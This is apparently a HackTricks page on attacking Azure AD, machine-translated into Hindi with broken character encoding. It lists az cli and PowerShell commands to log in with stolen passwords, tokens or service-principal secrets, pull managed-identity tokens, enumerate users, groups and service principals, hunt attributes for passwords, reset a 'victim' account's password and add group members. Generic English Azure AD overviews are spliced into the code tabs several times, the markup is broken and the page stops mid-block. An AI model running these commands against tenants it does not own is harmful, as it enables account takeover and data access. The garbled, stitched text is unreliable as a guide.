# Az - AzureAD

<details>

<summary><strong>‡§Ö‡§™‡§®‡•á ‡§µ‡•ç‡§Ø‡§æ‡§™‡§æ‡§∞ ‡§ï‡§æ ‡§™‡•ç‡§∞‡§ö‡§æ‡§∞ HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡•á‡§Ç ‡§Ø‡§æ PEASS ‡§ï‡•á ‡§®‡§µ‡•Ä‡§®‡§§‡§Æ ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§ï‡•ã ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç ‡§Ø‡§æ HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§° ‡§ï‡§∞‡•á‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è HackTricks ‡§ï‡•Ä ‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Ç ‡§¶‡•á‡§ñ‡•á‡§Ç](https://github.com/sponsors/carlospolop)!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS & HackTricks swag**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ‡§ï‡•Ä ‡§ñ‡•ã‡§ú ‡§ï‡§∞‡•á‡§Ç, ‡§π‡§Æ‡§æ‡§∞‡§æ ‡§µ‡§ø‡§∂‡•á‡§∑ ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π [**NFTs**](https://opensea.io/collection/the-peass-family)
* **‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç** üí¨ [**Discord ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**telegram ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Ø‡§æ **‡§´‡•â‡§≤‡•ã** ‡§ï‡§∞‡•á‡§Ç ‡§Æ‡•Å‡§ù‡•á **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **‡§Ö‡§™‡§®‡•á ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç, PRs ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡§ï‡•á** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### ‡§ó‡§£‡§®‡§æ

‡§á‡§∏ ‡§ó‡§£‡§®‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™ [**az cli ‡§ü‡•Ç‡§≤**](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)**,** **PowerShell ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤** [**AzureAD**](https://www.powershellgallery.com/packages/AzureAD/) (‡§Ø‡§æ [**AzureAD Preview**](https://www.powershellgallery.com/packages/AzureADPreview)) ‡§î‡§∞ [**Az PowerShell**](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps) ‡§Æ‡•â‡§°‡•ç‡§Ø‡•Ç‡§≤ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

{% hint style="success" %}
‡§≤‡§ø‡§®‡§ï‡•ç‡§∏ ‡§Æ‡•á‡§Ç ‡§Ü‡§™‡§ï‡•ã PowerShell Core ‡§ï‡•ã ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§ó‡•Ä:
```bash
sudo apt-get update
sudo apt-get install -y wget apt-transport-https software-properties-common

# Ubuntu 20.04
wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb

# Update repos
sudo apt-get update
sudo add-apt-repository universe

# Install & start powershell
sudo apt-get install -y powershell
pwsh

# Az cli
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```
{% endhint %}

### **‡§ï‡§®‡•á‡§ï‡•ç‡§∂‡§®**

{% tabs %}
{% tab title="az cli" %}
```bash
az login #This will open the browser
az login -u <username> -p <password> #Specify user and password
az login --identity #Use the current machine managed identity (metadata)
az login --identity -u /subscriptions/<subscriptionId>/resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myID #Login with user managed identity
# Login as service principal
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p VerySecret --tenant contoso.onmicrosoft.com #With password
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p ~/mycertfile.pem --tenant contoso.onmicrosoft.com #With cert

# Request access token (ARM)
az account get-access-token
# Request access token for different resource. Supported tokens: aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
az account get-access-token --resource-type aad-graph

# If you want to configure some defaults
az configure

# Get user logged-in already
az ad signed-in-user show

# Help
az find "vm" # Find vm commands
az vm -h # Get subdomains
az ad user list --query-examples # Get examples
```
{% code overflow="wrap" %}
```powershell
Connect-AzureAD #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds

# Using tokens
## AzureAD cannot request tokens, but can use AADGraph and MSGraph tokens to connect
Connect-AzureAD -AccountId test@corp.onmicrosoft.com -AadAccessToken $token
```
{% endcode %}
{% endtab %}

{% tab title="Az PowerShell" %}
```powershell
Connect-AzAccount #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@corp.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds

# Get Access Token
(Get-AzAccessToken).Token
# Request access token to other endpoints: AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, MSGraph, OperationalInsights, ResourceManager, Storage, Synapse
Get-AzAccessToken -ResourceTypeName MSGraph
(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token

# Conenct with access token
Connect-AzAccount -AccountId test@corp.onmicrosoft.com -AccessToken $token
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId <ACCOUNT-ID>
## The -AccessToken is from management.azure.com

# Connect with Service principal/enterprise app secret
$password = ConvertTo-SecureString 'KWEFNOIRFIPMWL.--DWPNVFI._EDWWEF_ADF~SODNFBWRBIF' -AsPlainText -Force
$creds = New-Object
System.Management.Automation.PSCredential('2923847f-fca2-a420-df10-a01928bec653', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d

#All the Azure AD cmdlets have the format *-AzAD*
Get-Command *azad*
#Cmdlets for other Azure resources have the format *Az*
Get-Command *az*
```
{% tab title="Raw PS" %}
{% code overflow="wrap" %}
```powershell
#Using management
$Token = 'eyJ0eXAi..'
# List subscriptions
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using graph
Invoke-WebRequest -Uri "https://graph.windows.net/myorganization/users?api-version=1.6" -Headers @{Authorization="Bearer {0}" -f $Token}
```
{% endcode %}
{% endtab %}

{% tab title="‡§ï‡§ö‡•ç‡§ö‡§æ ‡§ë‡§™‡§∞‡•á‡§ü‡§ø‡§Ç‡§ó ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ" %}
{% code overflow="wrap" %}
```bash
# Request tokens to access endpoints
# ARM
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# Vault
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```
{% code %}
{% endcode %}
{% endtab %}
{% endtabs %}

‡§ú‡§¨ ‡§Ü‡§™ ‡§ï‡§ø‡§∏‡•Ä ‡§™‡•ç‡§∞‡•ã‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á CLI ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á Azure ‡§Æ‡•á‡§Ç ‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç, ‡§§‡•ã ‡§Ü‡§™ **Microsoft** ‡§ï‡•á ‡§è‡§ï **tenant** ‡§∏‡•á ‡§è‡§ï **Azure Application** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç‡•§ ‡§á‡§® Applications, ‡§ú‡•à‡§∏‡•á ‡§ï‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•á ‡§ñ‡§æ‡§§‡•á ‡§Æ‡•á‡§Ç ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç, **‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§Ü‡§à‡§°‡•Ä** ‡§∞‡§ñ‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§Ü‡§™ **‡§ï‡•â‡§®‡•ç‡§∏‡•ã‡§≤ ‡§Æ‡•á‡§Ç ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§®‡§π‡•Ä‡§Ç ‡§¶‡•á‡§§‡•á ‡§π‡•à‡§Ç**, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ø‡•á ‡§∏‡§≠‡•Ä ‡§°‡§ø‡§´‡§º‡•â‡§≤‡•ç‡§ü ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§è‡§ï **powershell ‡§∏‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü** ‡§ú‡•ã **‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡§ø‡§§** ‡§ï‡§∞‡§§‡§æ ‡§π‡•à, ‡§è‡§ï ‡§ê‡§™ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§ï‡§æ ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§Ü‡§à‡§°‡•Ä ‡§π‡•à **`1950a258-227b-4e31-a9cf-717495945fc2`**‡•§ ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§Ø‡§¶‡§ø ‡§ê‡§™ ‡§ï‡•â‡§®‡•ç‡§∏‡•ã‡§≤ ‡§Æ‡•á‡§Ç ‡§®‡§π‡•Ä‡§Ç ‡§¶‡§ø‡§ñ‡§æ‡§à ‡§¶‡•á‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§∏‡§ø‡§∏‡•ç‡§ü‡§Æ ‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§æ‡§™‡§ï ‡§â‡§∏ ‡§ê‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§ï‡•ã **‡§¨‡•ç‡§≤‡•â‡§ï ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à** ‡§§‡§æ‡§ï‡§ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§â‡§∏ ‡§ê‡§™ ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§ï‡§®‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§â‡§™‡§ï‡§∞‡§£‡•ã‡§Ç ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§® ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§Ç‡•§

‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø, ‡§ê‡§∏‡•á **‡§Ö‡§®‡•ç‡§Ø ‡§ï‡•ç‡§≤‡§æ‡§á‡§Ç‡§ü ‡§Ü‡§à‡§°‡•Ä** ‡§π‡•à‡§Ç ‡§ú‡§ø‡§®‡§ï‡•á ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§Ü‡§™ Azure ‡§∏‡•á ‡§ï‡§®‡•á‡§ï‡•ç‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç:
```powershell
# The important part is the ClientId, which identifies the application to login inside Azure

$token = Invoke-Authorize -Credential $credential `
-ClientId '1dfb5f98-f363-4b0f-b63a-8d20ada1e62d' `
-Scope 'Files.Read.All openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "https://graphtryit-staging.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId '65611c08-af8c-46fc-ad20-1888eb1b70d9' `
-Scope 'openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "chrome-extension://imjekgehfljppdblckcmjggcoboemlah" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId 'd3ce4cf8-6810-442d-b42e-375e14710095' `
-Scope 'openid' `
-Redirect_Uri "https://graphexplorer.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue
```
### ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ

{% tabs %}
{% tab title="az cli" %}
```bash
# Enumerate users
az ad user list --output table
az ad user list --query "[].userPrincipalName"
# Get info of 1 user
az ad user show --id "test@corp.onmicrosoft.com"
# Search "admin" users
az ad user list --query "[].displayName" | findstr /i "admin"
az ad user list --query "[?contains(displayName,'admin')].displayName"
# Search attributes containing the word "password"
az ad user list | findstr /i "password" | findstr /v "null,"
# All users from AzureAD
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi==null]"
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All users synced from on-prem
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi!=null]"
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get groups where the user is a member
az ad user get-member-groups --id <email>
# Get roles assigned to the user
az role assignment list --include-groups --include-classic-administrators true --assignee <email>
```
## Azure AD

Azure Active Directory (Azure AD) is a cloud-based identity and access management service provided by Microsoft. It allows organizations to manage user identities and control access to resources in the Azure cloud environment.

### Key Features

- **User Management**: Azure AD enables organizations to create and manage user accounts, assign roles and permissions, and enforce password policies.

- **Single Sign-On (SSO)**: Azure AD supports SSO, allowing users to sign in once and access multiple applications and resources without the need for separate credentials.

- **Multi-Factor Authentication (MFA)**: Azure AD provides MFA capabilities to add an extra layer of security by requiring users to provide additional verification, such as a code sent to their mobile device, in addition to their password.

- **Application Management**: Azure AD allows organizations to register and manage applications, control access to them, and enforce policies such as conditional access.

- **Identity Protection**: Azure AD includes features to detect and respond to identity-based threats, such as suspicious sign-in activities or leaked credentials.

- **Azure AD Connect**: Azure AD Connect is a tool that enables synchronization of on-premises Active Directory with Azure AD, allowing organizations to manage user identities across both environments.

### Security Considerations

When using Azure AD, it is important to consider the following security aspects:

- **Secure Configuration**: Ensure that Azure AD is properly configured with appropriate security settings, such as strong password policies, MFA enforcement, and conditional access policies.

- **Identity Governance**: Implement proper identity governance practices, including regular review of user accounts, role assignments, and access permissions to prevent unauthorized access.

- **Monitoring and Logging**: Enable logging and monitoring features in Azure AD to detect and respond to security incidents, such as suspicious sign-in activities or account compromises.

- **Threat Intelligence**: Stay updated with the latest threat intelligence and security advisories related to Azure AD to proactively mitigate potential risks.

- **Secure Integration**: When integrating applications with Azure AD, follow secure coding practices and ensure that proper authentication and authorization mechanisms are implemented to prevent unauthorized access.

By considering these security considerations and best practices, organizations can effectively leverage Azure AD while maintaining a secure cloud environment.
```powershell
# Enumerate Users
Get-AzureADUser -All $true
Get-AzureADUser -All $true | select UserPrincipalName
# Get info of 1 user
Get-AzureADUser -ObjectId test@corp.onmicrosoft.com | fl
# Search "admin" users
Get-AzureADUser -SearchString "admin" #Search admin at the begining of DisplayName or userPrincipalName
Get-AzureADUser -All $true |?{$_.Displayname -match "admin"} #Search "admin" word in DisplayName
# Get all attributes of a user
Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com|%{$_.PSObject.Properties.Name}
# Search attributes containing the word "password"
Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
# All users from AzureAD# All users from AzureAD
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All users synced from on-prem
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Objects created by a/any user
Get-AzureADUser [-ObjectId <email>] | Get-AzureADUserCreatedObject
# Devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Objects owned by a specific user
Get-AzureADUserOwnedObject -ObjectId test@corp.onmicrosoft.com
# Get groups & roles where the user is a member
Get-AzureADUserMembership -ObjectId 'test@corp.onmicrosoft.com'
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get devices registered by a user
Get-AzureADUserRegisteredDevice -ObjectId test@defcorphq.onmicrosoft.com
# Apps where a user has a role (role not shown)
Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *
# Get Administrative Units of a user
$userObj = Get-AzureADUser -Filter "UserPrincipalName eq 'bill@example.com'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where { $_.Id -eq $userObj.ObjectId } }
```
{% endtab %}

{% tab title="Az PowerShell" %}Az PowerShell
```powershell
# Enumerate users
Get-AzADUser
# Get details of a user
Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
# Search user by string
Get-AzADUser -SearchString "admin" #Search at the beginnig of DisplayName
Get-AzADUser | ?{$_.Displayname -match "admin"}
# Get roles assigned to a user
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
```
{% endtab %}
{% endtabs %}

#### ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡§æ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§¨‡§¶‡§≤‡•á‡§Ç

{% code overflow="wrap" %}
```powershell
$password = "ThisIsTheNewPassword.!123" | ConvertTo- SecureString -AsPlainText ‚ÄìForce

(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "victim@corp.onmicrosoft.com"}).ObjectId | Set- AzureADUserPassword -Password $password ‚ÄìVerbose
```
{% endcode %}

### ‡§∏‡§Æ‡•Ç‡§π

{% tabs %}
{% tab title="az cli" %}
```powershell
# Enumerate groups
az ad group list
az ad group list --query "[].[displayName]" -o table
# Get info of 1 group
az ad group show --group <group>
# Get "admin" groups
az ad group list --query "[].displayName" | findstr /i "admin"
az ad group list --query "[?contains(displayName,'admin')].displayName"
# All groups from AzureAD
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi==null]"
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All groups synced from on-prem
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi!=null]"
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get members of group
az ad group member list --group <group> --query "[].userPrincipalName" -o table
# Check if member of group
az ad group member check --group "VM Admins" --member-id <id>
# Get which groups a group is member of
az ad group get-member-groups -g "VM Admins"
# Get Apps where a group has a role (role not shown)
Get-AzureADGroup -ObjectId <id> | Get-AzureADGroupAppRoleAssignment | fl *
```
## Azure AD

Azure Active Directory (Azure AD) is a cloud-based identity and access management service provided by Microsoft. It allows organizations to manage user identities and control access to resources in the Azure cloud environment.

### Key Features

- **User Management**: Azure AD enables organizations to create and manage user accounts, assign roles and permissions, and enforce password policies.

- **Single Sign-On (SSO)**: Azure AD supports SSO, allowing users to sign in once and access multiple applications and resources without the need to enter credentials repeatedly.

- **Multi-Factor Authentication (MFA)**: Azure AD provides MFA capabilities to add an extra layer of security by requiring users to provide additional verification, such as a code sent to their mobile device, in addition to their password.

- **Application Management**: Azure AD allows organizations to register and manage applications, control access to them, and enforce policies for application usage.

- **Integration with Other Services**: Azure AD integrates with various Microsoft services, such as Azure DevOps, Azure Information Protection, and Azure Rights Management, to provide seamless identity and access management across different platforms.

### Security Considerations

- **Password Policies**: Organizations should enforce strong password policies, including requirements for password complexity, expiration, and account lockout.

- **Conditional Access**: Azure AD offers conditional access policies that allow organizations to define specific conditions under which users can access resources, such as requiring MFA for certain applications or locations.

- **Identity Protection**: Azure AD includes features for detecting and mitigating identity-based risks, such as suspicious sign-in activities or leaked credentials.

- **Privileged Identity Management (PIM)**: PIM allows organizations to manage and control access to privileged roles in Azure AD, reducing the risk of unauthorized access to sensitive resources.

- **Monitoring and Auditing**: Organizations should regularly monitor and review Azure AD logs and audit trails to detect any suspicious activities or unauthorized access attempts.

### Best Practices

- **Enable MFA**: Enabling MFA for all user accounts adds an extra layer of security and helps protect against unauthorized access.

- **Implement Conditional Access**: Use conditional access policies to enforce additional security measures, such as requiring MFA for high-risk activities or blocking access from certain locations.

- **Regularly Review and Update Policies**: Continuously review and update Azure AD policies to align with changing security requirements and best practices.

- **Monitor and Respond to Security Alerts**: Implement a robust monitoring system to detect and respond to security alerts promptly.

- **Educate Users**: Provide regular security awareness training to users to help them understand the importance of strong passwords, phishing prevention, and other security best practices.

{% endtab %}
```powershell
# Enumerate Groups
Get-AzureADGroup -All $true
# Get info of 1 group
Get-AzADGroup -DisplayName <resource_group_name> | fl
# Get "admin" groups
Get-AzureADGroup -SearchString "admin" | fl #Groups starting by "admin"
Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"} #Groups with the word "admin"
# Get groups allowing dynamic membership
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
# All groups that are from Azure AD
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All groups that are synced from on-prem (note that security groups are not synced)
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Get members of a group
Get-AzureADGroupMember -ObjectId <group_id>
# Get roles of group
Get-AzureADMSGroup -SearchString "Contoso_Helpdesk_Administrators" #Get group id
Get-AzureADMSRoleAssignment -Filter "principalId eq '69584002-b4d1-4055-9c94-320542efd653'"
# Get Administrative Units of a group
$groupObj = Get-AzureADGroup -Filter "displayname eq 'TestGroup'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where {$_.Id -eq $groupObj.ObjectId} }
```
{% endtab %}

{% tab title="Az PowerShell" %}
```powershell
# Get all groups
Get-AzADGroup
# Get details of a group
Get-AzADGroup -ObjectId <id>
# Search group by string
Get-AzADGroup -SearchString "admin" | fl * #Search at the beginnig of DisplayName
Get-AzADGroup |?{$_.Displayname -match "admin"}
# Get members of group
Get-AzADGroupMember -GroupDisplayName <resource_group_name>
# Get roles of group
Get-AzRoleAssignment -ResourceGroupName <resource_group_name>
```
{% endtab %}
{% endtabs %}

#### ‡§∏‡§Æ‡•Ç‡§π ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ú‡•ã‡§°‡§º‡•á‡§Ç

‡§∏‡§Æ‡•Ç‡§π ‡§ï‡•á ‡§Æ‡§æ‡§≤‡§ø‡§ï ‡§®‡§è ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•ã ‡§∏‡§Æ‡•Ç‡§π ‡§Æ‡•á‡§Ç ‡§ú‡•ã‡§°‡§º ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç

{% code overflow="wrap" %}
```powershell
Add-AzureADGroupMember -ObjectId <group_id> -RefObjectId <user_id> -Verbose
```
{% endcode %}

### ‡§∏‡•á‡§µ‡§æ ‡§™‡•ç‡§∞‡§ø‡§Ç‡§∏‡§ø‡§™‡§≤

{% hint style="info" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø **‡§∏‡•á‡§µ‡§æ ‡§™‡•ç‡§∞‡§ø‡§Ç‡§∏‡§ø‡§™‡§≤** PowerShell ‡§∂‡§¨‡•ç‡§¶‡§æ‡§µ‡§≤‡•Ä ‡§Æ‡•á‡§Ç **‡§è‡§Ç‡§ü‡§∞‡§™‡•ç‡§∞‡§æ‡§á‡§ú ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§®‡•ç‡§∏** ‡§ï‡•á ‡§∞‡•Ç‡§™ ‡§Æ‡•á‡§Ç ‡§Ü‡§ú‡§º‡•ç‡§Ø‡•Ç‡§∞ ‡§™‡•ã‡§∞‡•ç‡§ü‡§≤ (‡§µ‡•á‡§¨) ‡§Æ‡•á‡§Ç ‡§ï‡§π‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§
{% endhint %}

{% tabs %}
{% tab title="az cli" %}
```bash
# Get Service Principals
az ad sp list --all
az ad sp list --all --query "[].[displayName]" -o table
# Get details of one SP
az ad sp show --id 00000000-0000-0000-0000-000000000000
# Search SP by string
az ad sp list --all --query "[?contains(displayName,'app')].displayName"
# Get owner of service principal
az ad sp owner list --id <id> --query "[].[displayName]" -o table
# Get service principals owned by the current user
az ad sp list --show-mine
# List apps that have password credentials
az ad sp list --all --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad sp list -all --query "[?keyCredentials != null].displayName"
```
## Azure AD

Azure Active Directory (Azure AD) is a cloud-based identity and access management service provided by Microsoft. It allows organizations to manage user identities and control access to resources in the Azure cloud environment.

### Key Features

- **User Management**: Azure AD enables organizations to create and manage user accounts, assign roles and permissions, and enforce password policies.

- **Single Sign-On (SSO)**: Azure AD supports SSO, allowing users to sign in once and access multiple applications and resources without the need to enter credentials repeatedly.

- **Multi-Factor Authentication (MFA)**: Azure AD provides MFA capabilities to add an extra layer of security by requiring users to provide additional verification, such as a code sent to their mobile device, in addition to their password.

- **Application Management**: Azure AD allows organizations to register and manage applications, control access to them, and enforce policies for application usage.

- **Integration with Other Services**: Azure AD integrates with various Microsoft services, such as Azure DevOps, Azure Information Protection, and Azure Rights Management, to provide seamless access and security across the Azure ecosystem.

### Security Considerations

When pentesting Azure AD, it is important to focus on the following areas:

- **User Enumeration**: Enumerating valid user accounts can help an attacker identify potential targets for further exploitation.

- **Password Attacks**: Brute-forcing, password spraying, and credential stuffing attacks can be used to gain unauthorized access to user accounts.

- **Privilege Escalation**: Exploiting misconfigurations or vulnerabilities in Azure AD can lead to privilege escalation, allowing an attacker to gain higher levels of access and control.

- **Token-based Attacks**: Azure AD uses tokens for authentication and authorization. Understanding how these tokens are generated, validated, and used can help identify potential vulnerabilities.

- **Application Security**: Assessing the security of applications integrated with Azure AD is crucial, as vulnerabilities in these applications can be leveraged to compromise user accounts or gain unauthorized access to resources.

### Tools and Techniques

Various tools and techniques can be used for pentesting Azure AD:

- **Azure AD PowerShell Module**: This module provides cmdlets for managing Azure AD resources and can be used for tasks such as user management, application registration, and role assignment.

- **OAuth 2.0 and OpenID Connect**: Understanding the OAuth 2.0 and OpenID Connect protocols can help in testing the security of Azure AD authentication and authorization mechanisms.

- **Token Manipulation**: Tools like `jwt_tool` and `jwt-cracker` can be used to manipulate and crack JWT tokens used by Azure AD.

- **Password Attacks**: Tools like `Hydra` and `Burp Suite` can be used for password attacks, such as brute-forcing and password spraying.

- **Application Security Testing**: Tools like `OWASP ZAP` and `Burp Suite` can be used to test the security of applications integrated with Azure AD.

### References

- [Azure AD Documentation](https://docs.microsoft.com/en-us/azure/active-directory/)
- [Azure AD PowerShell Module](https://docs.microsoft.com/en-us/powershell/azure/new-azureps-module-az?view=azps-10.11.0)
- [OAuth 2.0](https://oauth.net/2/)
- [OpenID Connect](https://openid.net/connect/)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
```powershell
# Get Service Principals
Get-AzureADServicePrincipal -All $true
# Get details about a SP
Get-AzureADServicePrincipal -ObjectId <id> | fl *
# Get SP by string name or Id
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"} | fl
